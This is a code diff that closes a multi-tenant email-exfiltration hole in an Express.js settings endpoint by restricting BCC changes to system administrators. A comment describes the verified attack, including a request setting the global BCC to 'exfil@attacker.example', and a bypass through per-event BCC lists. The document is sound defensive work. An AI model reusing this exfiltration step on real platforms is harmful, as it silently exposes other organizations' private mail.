@@ -13,7 +13,7 @@
 
 const express = require('express');
 const { pool } = require('../db');
-const { requireAuth, requireRole } = require('../auth');
+const { requireAuth, requireRole, hasCapability } = require('../auth');
 const { sendEmail, isEnabled, isDryRun, getEmailSettings, setEmailSettings } = require('../email');
 const { EVENTS } = require('../email-events');
 
@@ -118,6 +118,57 @@ router.get('/settings',
   }
 );
 
+// ── A BCC recipient is silent mail exfiltration, so only the platform
+//    operator may add one ───────────────────────────────────────────────────
+//
+// WHAT WAS OPEN. This endpoint is `requireRole('admin')` — every tenant's org
+// admin — and it writes app_settings(key='email'), which is ONE GLOBAL ROW: no
+// organization_id, one blob for the whole platform. Verified live over HTTP:
+// an org-A admin PUT `globalBcc: 'exfil@attacker.example'` and got 200; the
+// other tenant's admin read the same address back from GET /api/email/settings,
+// one shared row confirmed. email.js sendForEvent then merges globalBcc onto
+// EVERY event email, for EVERY tenant — assignments, lead notifications, sub
+// handoffs, cert reminders. No escalation, one call, nothing on screen anywhere
+// to say it happened. The verifier ranked it first for that reason.
+//
+// WHY THE RULE IS ABOUT BCC AND NOT ABOUT `globalBcc`. `settings.events[k].bcc`
+// is the same mechanism one field over: sendForEvent concatenates the per-event
+// list with the global one and dedupes. Gating only the field the report named
+// would have left the bypass in the same request body — set a per-event BCC on
+// every event and the exfiltration is identical, merely enumerated. So the
+// rule is stated over the whole blob:
+//
+//   No BCC address anywhere in app_settings('email') may be ADDED or CHANGED
+//   by a caller who does not hold SYSTEM_ADMIN.
+//
+// WHY THIS AND NOT `requireSystemAdmin` ON THE WHOLE DOOR. The per-event
+// enable/disable toggles, digest mode and quiet hours are global too, and the
+// org-admin Email surface (Admin -> Templates -> Email) edits them today. Those
+// are noise-and-availability settings, not a copy of the mail. Taking the whole
+// endpoint would trade a boundary for an outage on the part that carries no
+// secret. The BCC lists are the part that does.
+//
+// WHY "CHANGED", NOT "PRESENT". The admin UI PUTs the whole blob back on every
+// save, current BCC values included. Refusing any request that merely CARRIES a
+// BCC would 403 every ordinary toggle save the moment an address existed. The
+// guard compares against what is stored and fires only on a real delta — so an
+// org admin's unchanged echo passes, and the stored value survives a client
+// that omits the field entirely (the old handler wiped it to '' in that case).
+function bccFingerprint(settings) {
+  const s = settings || {};
+  const out = [];
+  String(s.globalBcc == null ? '' : s.globalBcc)
+    .split(',').map((x) => x.trim().toLowerCase()).filter(Boolean)
+    .forEach((a) => out.push('global:' + a));
+  const events = (s.events && typeof s.events === 'object') ? s.events : {};
+  Object.keys(events).forEach((k) => {
+    const list = (events[k] && Array.isArray(events[k].bcc)) ? events[k].bcc : [];
+    list.map((x) => String(x == null ? '' : x).trim().toLowerCase()).filter(Boolean)
+      .forEach((a) => out.push(k + ':' + a));
+  });
+  return out.sort().join('|');
+}
+
 // PUT /api/email/settings — replace the email config blob. Validates
 // shape lightly (events object + bool/string scalars); the admin UI
 // is the only writer so we trust its structure.
@@ -126,9 +177,11 @@ router.put('/settings',
   async (req, res) => {
     try {
       const b = req.body || {};
-      const settings = {
+      const stored = await getEmailSettings();
+      const submitted = {
         events: (b.events && typeof b.events === 'object') ? b.events : {},
-        globalBcc: typeof b.globalBcc === 'string' ? b.globalBcc : '',
+        // Absent field means "unchanged", not "cleared" — see the note above.
+        globalBcc: typeof b.globalBcc === 'string' ? b.globalBcc : (stored.globalBcc || ''),
         digestMode: !!b.digestMode,
         quietHours: (b.quietHours && typeof b.quietHours === 'object') ? {
           enabled: !!b.quietHours.enabled,
@@ -136,6 +189,19 @@ router.put('/settings',
           end: typeof b.quietHours.end === 'string' ? b.quietHours.end : '07:00'
         } : { enabled: false, start: '21:00', end: '07:00' }
       };
+
+      // Compared as SETS of addresses, so reordering or recasing is not a
+      // change and cannot be used to smuggle one past the guard either.
+      const settings = submitted;
+      if (bccFingerprint(submitted) !== bccFingerprint(stored) &&
+          !hasCapability(req.user, 'SYSTEM_ADMIN')) {
+        return res.status(403).json({
+          error: 'Only a system administrator can change BCC recipients. ' +
+                 'Email settings are a single platform-wide record, so a BCC ' +
+                 'address here receives every organization\'s mail.'
+        });
+      }
+
       await setEmailSettings(settings);
       res.json({ ok: true, settings: settings });
     } catch (e) {
